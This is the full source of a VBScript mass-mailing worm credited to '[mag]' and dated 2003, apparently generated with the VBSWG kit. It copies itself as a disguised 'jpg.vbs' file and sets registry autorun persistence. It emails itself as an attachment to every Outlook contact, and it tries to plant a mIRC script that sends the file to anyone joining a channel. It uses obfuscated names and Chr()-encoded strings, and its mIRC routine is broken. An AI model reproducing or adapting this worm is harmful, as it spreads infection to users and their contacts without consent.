'Vbs.Vbswg.Vbswg Worm Created By [mag]. 4/13/2003
Set L8IPCRVC = createobject("scripting.filesystemobject")
S917A3O0 = L8IPCRVC.getspecialfolder(0)
EDKKLUJL = S917A3O0 & "\Vbswg_Worm.jpg.vbs"
Set I1V11684 = createobject("wscript.shell")
I1V11684.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MAG", "wscript.exe " & EDKKLUJL & " %"
L8IPCRVC.copyfile wscript.scriptfullname, EDKKLUJL
If I1V11684.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg Worm\BF72T1U5") <> 1 then
CE200FMD
End if
If I1V11684.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg Worm\O9M8QPKR") <> 1 then
HG0EG0RN ""
End if
Function CE200FMD()
Set LP41VI86 = CreateObject("Outlook.Application")
If LP41VI86 = "Outlook" Then
Set SV40DO94 = LP41VI86.GetNameSpace("MAPI")
Set PJA5735M = SV40DO94.AddressLists
For Each PPP253TP In PJA5735M
If PPP253TP.AddressEntries.Count <> 0 Then
E5ENHK87 = PPP253TP.AddressEntries.Count
For N13VNRRH = 1 To E5ENHK87
Set QL868SNH = LP41VI86.CreateItem(0)
Set RC6I7KGR = PPP253TP.AddressEntries(N13VNRRH)
QL868SNH.To = RC6I7KGR.Address
QL868SNH.Subject = "Very Important!"
QL868SNH.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set OTF3KMK8 =QL868SNH." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
HL1B2E6R = EDKKLUJL
QL868SNH.DeleteAfterSubmit = True
OTF3KMK8.Add HL1B2E6R
If QL868SNH.To <> "" Then
QL868SNH.Send
End If
Next
End If
Next
End If
End function
Function HG0EG0RN(D4PU4898)
If D4PU4898 <> "" Then
Q32IRS8P = I1V11684.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If L8IPCRVC.fileexists("c:\mirc\mirc.ini") Then
D4PU4898 = "c:\mirc"
ElseIf L8IPCRVC.fileexists("c:\mirc32\mirc.ini") Then
D4PU4898 = "c:\mirc32"
ElseIf L8IPCRVC.fileexists(Q32IRS8P & "\mirc\mirc.ini") Then
D4PU4898 = Q32IRS8P & "\mirc"
ElseIf L8IPCRVC.fileexists(Q32IRS8P & "\mirc32\mirc.ini") Then
D4PU4898 = Q32IRS8P & "\mirc"
Else
D4PU4898 = ""
End If
End If
If D4PU4898 <> "" Then
Set OEN765KA = L8IPCRVC.CreateTextFile(D4PU4898 & "\script.ini", True)
OEN765KA = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
OEN765KA = OEN765KA & vbCrLf & "n0=on 1:JOIN:#:{"
OEN765KA = OEN765KA & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
OEN765KA = OEN765KA & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
OEN765KA = OEN765KA & EDKKLUJL
OEN765KA = OEN765KA & vbCrLf & "n3=}"
script.Close
End If
End Function
'Vbswg 2 Beta. By [K]
